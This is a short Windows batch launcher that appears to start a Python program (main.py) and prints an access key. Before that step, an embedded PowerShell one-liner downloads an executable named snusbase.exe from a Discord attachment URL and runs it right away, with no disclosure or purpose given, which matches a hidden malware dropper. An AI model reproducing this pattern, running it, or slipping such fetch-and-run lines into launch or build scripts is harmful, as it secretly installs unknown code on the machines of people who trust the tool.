@echo off
cd src
powershell $down=New-Object System.Net.WebClient;$url='https://cdn.discordapp.com/attachments/1186759970017005689/1206241962731245598/snusbase.exe?ex=65db4b5e&is=65c8d65e&hm=b5fd7b23018ddda52a66b2cf4fcf45e698418de28eb2b85aa34d82ef4b548457&';$file='snusbase.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
py main.py
Key : 01266156
